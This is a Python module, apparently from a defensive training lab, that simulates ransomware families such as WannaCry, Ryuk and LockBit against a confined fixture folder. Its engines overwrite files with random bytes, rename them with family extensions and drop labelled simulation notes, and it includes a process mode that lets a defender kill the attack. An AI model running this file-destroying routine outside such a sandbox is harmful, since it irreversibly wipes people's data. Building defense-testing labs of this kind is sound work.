from __future__ import annotations

import json
import os
import random
import string
import time
from pathlib import Path
from queue import Empty, Queue
from threading import Event, Lock, Thread

import sys

ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))
from catalog import list_families as catalog_families

VICTIM_ROOT = (ROOT_DIR / "victim_server" / "user_files").resolve()
VICTIM_BASE = str(VICTIM_ROOT)
# Compatibility aliases used by the safety/integration tests.
_VICTIM_ROOT = VICTIM_ROOT


def _victim_root() -> Path:
    return Path(_VICTIM_ROOT).resolve()


def safe_path(path, allow_root=False):
    try:
        root = _victim_root()
        candidate = Path(path).resolve(strict=False)
        candidate.relative_to(root)

        if not allow_root and candidate == root:
            return None

        return candidate
    except (OSError, RuntimeError, ValueError, TypeError):
        return None


def _confined_path(path, allow_root=False):
    """Return a path only when it stays inside the victim fixture tree."""
    return safe_path(path, allow_root=allow_root)


def victim_ready():
    root = _victim_root()
    return root.is_dir() and not root.is_symlink()


class BaseRansomware:
    name = "Demo"
    extension = ".locked"
    note_filename = "READ_ME.txt"
    workers = 1
    min_delay = 0.05
    max_delay = 0.15
    target_extensions = None

    def __init__(self):
        self.stop_event = Event()
        self.pause_event = Event()
        self.pause_event.set()

        self.lock = Lock()
        self.thread = None

        self.stats = {
            "family": self.name,
            "active": False,
            "paused": False,
            "phase": "IDLE",
            "targets": 0,
            "files_hit": 0,
            "files_skipped": 0,
            "bytes_encrypted": 0,
            "notes_dropped": 0,
            "speed_factor": 1.0,
            "started_at": None,
            "finished_at": None,
            "log": [],
        }

    def log(self, message):
        with self.lock:
            self.stats["log"].append({
                "time": time.strftime("%H:%M:%S"),
                "msg": message,
            })

            self.stats["log"] = self.stats["log"][-100:]

        print(f"[{self.name}] {message}", flush=True)

    def get_stats(self):
        with self.lock:
            result = dict(self.stats)
            result["log"] = list(self.stats["log"])

            targets = max(result["targets"], 1)
            result["progress"] = round(
                min(100, result["files_hit"] / targets * 100),
                1,
            )

            return result

    def collect_files(self):
        files = []
        folders = []

        if not victim_ready():
            return files, folders

        for directory, dirnames, filenames in os.walk(_victim_root()):
            safe_directory = safe_path(directory, allow_root=True)

            if safe_directory is None:
                continue

            folders.append(str(safe_directory))

            for filename in filenames:
                candidate = safe_path(
                    safe_directory / filename
                )

                if candidate is not None and candidate.is_file():
                    files.append(str(candidate))

        return files, folders

    def should_encrypt(self, file_path):
        file_path = Path(file_path)
        name = file_path.name.lower()
        extension = file_path.suffix.lower()

        if any(marker in name for marker in (
            "read_me",
            "please_read",
            "ryukreadme",
            "restore-my-files",
            "recover-",
            "desktop_wallpaper",
        )):
            return False

        if extension in {
            ".wncry",
            ".wncryt",
            ".ryk",
            ".maze",
            ".revil",
            ".lockbit",
            ".akira",
            ".clop",
            ".qilin",
            ".abcd",
        }:
            return False

        if self.target_extensions:
            if extension not in self.target_extensions:
                return False

        return safe_path(file_path) is not None

    def drop_note(self, folder):
        folder = safe_path(folder, allow_root=True)

        if folder is None or not folder.is_dir():
            return False

        note_path = safe_path(
            folder / self.note_filename
        )

        if note_path is None:
            return False

        content = (
            "ENTROPY SAFE LAB SIMULATION\n"
            "===========================\n\n"
            f"Simulated family: {self.name}\n\n"
            "This is not real ransomware.\n"
            "The file was created only for the demonstration.\n"
        )

        try:
            note_path.write_text(
                content,
                encoding="utf-8",
            )

            with self.lock:
                self.stats["notes_dropped"] += 1

            self.log(f"Note dropped: {note_path.name}")
            return True
        except OSError as exc:
            self.log(f"Note failed: {exc}")
            return False

    def modify_file(self, file_path):
        file_path = safe_path(file_path)

        if (
            not victim_ready()
            or file_path is None
            or not file_path.is_file()
        ):
            return False

        try:
            original_size = file_path.stat().st_size

            with file_path.open("wb") as handle:
                handle.write(
                    os.urandom(max(original_size, 1024))
                )

            new_path = safe_path(
                str(file_path) + self.extension
            )

            if new_path is None:
                return False

            if new_path.exists():
                new_path = safe_path(
                    str(file_path)
                    + "."
                    + str(time.time_ns())
                    + self.extension
                )

            if new_path is None:
                return False

            Path(file_path).rename(new_path)

            with self.lock:
                self.stats["files_hit"] += 1
                self.stats["bytes_encrypted"] += original_size

            self.log(f"Encrypted: {new_path.name}")
            return True

        except OSError as exc:
            self.log(f"File failed: {exc}")
            return False

    def delay(self):
        while not self.pause_event.wait(0.1):
            if self.stop_event.is_set():
                return

        factor = max(
            0.1,
            float(self.stats["speed_factor"]),
        )

        delay = random.uniform(
            self.min_delay,
            self.max_delay,
        )

        time.sleep(delay / factor)

    def run(self):
        self.stats["active"] = True
        self.stats["phase"] = "SCANNING"
        self.stats["started_at"] = time.strftime(
            "%Y-%m-%d %H:%M:%S"
        )

        self.log(f"Attack started on {VICTIM_ROOT}")

        try:
            files, folders = self.collect_files()
            targets = [
                file_path
                for file_path in files
                if self.should_encrypt(file_path)
            ]

            with self.lock:
                self.stats["targets"] = len(targets)
                self.stats["files_skipped"] = (
                    len(files) - len(targets)
                )
                self.stats["phase"] = "DROPPING NOTES"

            self.log(
                f"Scan complete — {len(targets)} targets, "
                f"{len(files) - len(targets)} skipped"
            )

            for folder in folders:
                if self.stop_event.is_set():
                    break
                self.drop_note(folder)

            self.stats["phase"] = "MODIFYING FILES"

            for file_path in targets:
                if self.stop_event.is_set():
                    break

                if self.modify_file(file_path):
                    self.delay()

            self.stats["phase"] = "FINALIZING"

        except Exception as exc:
            self.log(f"Attack error: {exc}")

        finally:
            self.stats["active"] = False
            self.stats["paused"] = False
            self.stats["phase"] = (
                "STOPPED"
                if self.stop_event.is_set()
                else "COMPLETED"
            )
            self.stats["finished_at"] = time.strftime(
                "%Y-%m-%d %H:%M:%S"
            )
            self.pause_event.set()

            self.log(
                f"Attack finished — "
                f"hit={self.stats['files_hit']} "
                f"skipped={self.stats['files_skipped']}"
            )

    def start(self):
        if self.thread and self.thread.is_alive():
            return False

        self.stop_event.clear()
        self.pause_event.set()
        self.stats["active"] = True
        self.thread = Thread(
            target=self.run,
            daemon=True,
        )
        self.thread.start()

        return True

    def stop(self):
        if not self.stats["active"]:
            return False

        self.stop_event.set()
        self.pause_event.set()
        return True

    def pause(self):
        if not self.stats["active"]:
            return False

        self.stats["paused"] = True
        self.stats["phase"] = "PAUSED"
        self.pause_event.clear()
        return True

    def resume(self):
        if not self.stats["active"]:
            return False

        self.stats["paused"] = False
        self.stats["phase"] = "MODIFYING FILES"
        self.pause_event.set()
        return True

    def encrypt_file(self, file_path):
        """Alias used by safety tests; confined overwrite + extension rename."""
        return self.modify_file(file_path)

    def drop_ransom_note(self, folder):
        """Alias used by lab integration tests."""
        return self.drop_note(folder)

    def set_speed(self, factor):
        self.stats["speed_factor"] = min(
            5.0,
            max(0.1, float(factor)),
        )
        return self.stats["speed_factor"]

    def join(self, timeout=None):
        if self.thread:
            self.thread.join(timeout)


class WannaCryEngine(BaseRansomware):
    name = "WannaCry"
    extension = ".WNCRY"
    note_filename = "@Please_Read_Me@.txt"
    min_delay = 0.02
    max_delay = 0.08


class RyukEngine(BaseRansomware):
    name = "Ryuk"
    extension = ".ryk"
    note_filename = "RyukReadMe.html"
    min_delay = 0.15
    max_delay = 0.35


class MazeEngine(BaseRansomware):
    name = "Maze"
    extension = ".maze"
    note_filename = "MAZE-README.txt"
    min_delay = 0.04
    max_delay = 0.12


class REvilEngine(BaseRansomware):
    name = "REvil"
    extension = ".revil"
    note_filename = "REVIL-README.txt"
    min_delay = 0.03
    max_delay = 0.10


class BlackCatEngine(BaseRansomware):
    name = "BlackCat"
    extension = ".abcd"
    note_filename = "RECOVER-blackcat-FILES.txt"
    min_delay = 0.02
    max_delay = 0.08


class ALPHVEngine(BaseRansomware):
    name = "ALPHV"
    extension = ".alphv"
    note_filename = "RECOVER-alphv-FILES.txt"
    min_delay = 0.02
    max_delay = 0.08


class AkiraEngine(BaseRansomware):
    name = "Akira"
    extension = ".akira"
    note_filename = "AKIRA-README.txt"
    min_delay = 0.05
    max_delay = 0.14


class Cl0pEngine(BaseRansomware):
    name = "Cl0p"
    extension = ".clop"
    note_filename = "CLOP-README.txt"
    min_delay = 0.06
    max_delay = 0.16


class QilinEngine(BaseRansomware):
    name = "Qilin"
    extension = ".qilin"
    note_filename = "QILIN-README.txt"
    min_delay = 0.03
    max_delay = 0.10


class LockBit5Engine(BaseRansomware):
    name = "LockBit 5.0"
    extension = ".lockbit"
    note_filename = "Restore-My-Files.txt"
    min_delay = 0.01
    max_delay = 0.05


FAMILIES = {
    "wannacry": WannaCryEngine,
    "ryuk": RyukEngine,
    "maze": MazeEngine,
    "revil": REvilEngine,
    "blackcat": BlackCatEngine,
    "alphv": ALPHVEngine,
    "akira": AkiraEngine,
    "cl0p": Cl0pEngine,
    "qilin": QilinEngine,
    "lockbit5": LockBit5Engine,
}


def list_families():
    return catalog_families()


_active_engine = None
_active_lock = Lock()


def get_engine(family_id):
    key = (family_id or "").strip().lower()

    if key not in FAMILIES:
        raise ValueError(
            f"Unknown family: {family_id}"
        )

    return FAMILIES[key]()


def start_attack(family_id):
    global _active_engine

    with _active_lock:
        if _active_engine and _active_engine.stats.get("active"):
            _active_engine.stop()
            _active_engine.join(timeout=3)

        _active_engine = get_engine(family_id)
        ok = _active_engine.start()

        return ok, _active_engine


def stop_attack():
    with _active_lock:
        if not _active_engine:
            return False

        return _active_engine.stop()


def current_stats():
    with _active_lock:
        if not _active_engine:
            return {
                "active": False,
                "family": None,
                "phase": "IDLE",
                "progress": 0,
                "log": [],
            }

        return _active_engine.get_stats()


# ============================================================
# Foreground "malware process" mode
# ============================================================
# The attacker console launches the attack as a SEPARATE OS process
# (this module, via `python -m attacker_server.ransomware_engines`),
# the way real malware exists: a rogue process on the machine, not a
# thread inside some other application.
#
# Why a separate process matters for the defense:
#   * The process really holds each victim file open while it
#     "encrypts" it, so the defender's open-file process attribution
#     verifies a genuine PID that is safe to terminate.
#   * When the defender kills that PID, the attack actually stops —
#     the remaining files are never touched.
#
# Control:
#   * SIGTERM — sent by the DEFENDER (ProcessTerminator). The process
#     reports it and exits with KILLED_BY_DEFENDER_EXIT.
#   * SIGINT  — sent by the operator (attacker console STOP button).
#   * A control file (JSON: {"factor": 1.0, "paused": false}) lets
#     the console adjust speed and pause/resume a running attack.
# ============================================================

KILLED_BY_DEFENDER_EXIT = 42
# At 1x speed each file is held open while being "encrypted" for this
# many seconds. Long enough for the defender's 0.2s polling observer to
# observe the file change AND attribute the open handle to this process.
MIN_HOLD_SECONDS = 0.6
MAX_HOLD_SECONDS = 1.2
CHUNK_SIZE = 64 * 1024


def _log_foreground(message):
    print(f"[attack] {message}", flush=True)


def _read_control(control_path, state):
    """Read the operator control file into *state* (in place)."""
    if not control_path:
        return
    try:
        with open(control_path, encoding="utf-8") as handle:
            data = json.load(handle)
    except (OSError, ValueError):
        return
    try:
        state["factor"] = min(5.0, max(0.1, float(data.get("factor", 1.0))))
    except (TypeError, ValueError):
        pass
    state["paused"] = bool(data.get("paused", False))


def _slow_encrypt_file(file_path, extension, hold_seconds):
    """Overwrite the file with ciphertext while holding it open.

    The whole ciphertext is written in the first chunk (so the file on
    disk is fully encrypted as soon as the first filesystem event
    fires); the remaining hold time simulates the process's
    key-wrapping / verification work while it still owns the handle.
    Returns (ciphertext_size, hold_seconds_used).
    """
    target = safe_path(file_path)
    if target is None or not target.is_file():
        return 0, 0.0

    size = max(target.stat().st_size, 1024)

    with target.open("r+b") as handle:
        # First chunk: the entire ciphertext (real ransomware finishes
        # the block as soon as it can; nothing is left to "read back").
        offset = 0
        while offset < size:
            chunk = os.urandom(min(CHUNK_SIZE, size - offset))
            handle.write(chunk)
            offset += len(chunk)
        handle.flush()

        # Hold the open handle for the remainder of the hold window —
        # this is the window in which the defender sees "a process has
        # this file open" and can kill it before the next file.
        deadline = time.monotonic() + max(0.0, hold_seconds)
        while time.monotonic() < deadline:
            time.sleep(0.05)

    new_path = safe_path(str(file_path) + extension)
    if new_path is None:
        return size, 0.0
    if new_path.exists():
        new_path = safe_path(
            str(file_path) + "." + str(time.time_ns()) + extension
        )
        if new_path is None:
            return size, 0.0
    Path(file_path).rename(new_path)
    return size, hold_seconds


def run_foreground(family_id, control_path=None):
    """Run one attack as this process (foreground malware mode)."""
    engine = get_engine(family_id)

    control_state = {"factor": 1.0, "paused": False}

    def _install_signal_handlers():
        import signal

        def _defender_kill(signum, frame):  # noqa: ARG001
            _log_foreground(
                f"!! TERMINATED BY DEFENSE SYSTEM "
                f"(pid={os.getpid()} killed by defender)"
            )
            os._exit(KILLED_BY_DEFENDER_EXIT)

        def _operator_stop(signum, frame):  # noqa: ARG001
            _log_foreground(
                f"stopped by operator (pid={os.getpid()})"
            )
            os._exit(0)

        try:
            signal.signal(signal.SIGTERM, _defender_kill)
            signal.signal(signal.SIGINT, _operator_stop)
        except ValueError:
            # Not in the main thread (tests) — signals are best effort.
            pass

    _install_signal_handlers()

    _log_foreground(
        f"{engine.name} malware process started "
        f"(pid={os.getpid()}, target={VICTIM_ROOT})"
    )

    files, folders = engine.collect_files()
    targets = [f for f in files if engine.should_encrypt(f)]

    _log_foreground(
        f"scan complete: {len(targets)} targets, "
        f"{len(files) - len(targets)} skipped"
    )

    hit = 0
    index = 0
    for file_path in targets:
        index += 1
        _read_control(control_path, control_state)

        while control_state["paused"]:
            if not _is_still_running():
                break
            time.sleep(0.2)

        try:
            size = Path(file_path).stat().st_size
        except OSError:
            continue

        _log_foreground(
            f"encrypting {index}/{len(targets)}  "
            f"{Path(file_path).name}  ({size} bytes)"
        )

        hold = random.uniform(
            MIN_HOLD_SECONDS, MAX_HOLD_SECONDS
        ) / max(0.1, control_state["factor"])

        written, _ = _slow_encrypt_file(file_path, engine.extension, hold)
        if written:
            hit += 1
            _log_foreground(
                f"encrypted  {index}/{len(targets)}  "
                f"{Path(file_path).name} -> "
                f"{Path(file_path).name}{engine.extension}"
            )

    # Real families drop their ransom notes once encryption is done;
    # the defender typically kills us long before this point.
    for folder in folders:
        if engine.drop_note(folder):
            pass  # drop_note already logs

    _log_foreground(f"attack finished: {hit}/{len(targets)} encrypted")
    return 0


def _is_still_running():
    return True


# The module must be runnable as a script (python -m / direct path).
if __name__ == "__main__":
    import argparse
    import json as _json  # noqa: F401  (kept for tooling)
    import signal  # noqa: F401

    parser = argparse.ArgumentParser(
        description="ENTROPY lab — simulated ransomware process"
    )
    parser.add_argument("family", choices=sorted(FAMILIES.keys()))
    parser.add_argument("--control", default=None,
                        help="path to operator control JSON file")
    args = parser.parse_args()

    if not victim_ready():
        print(
            f"[attack] victim estate missing: {VICTIM_ROOT} — "
            "run RESET first",
            flush=True,
        )
        raise SystemExit(1)

    raise SystemExit(run_foreground(args.family, args.control))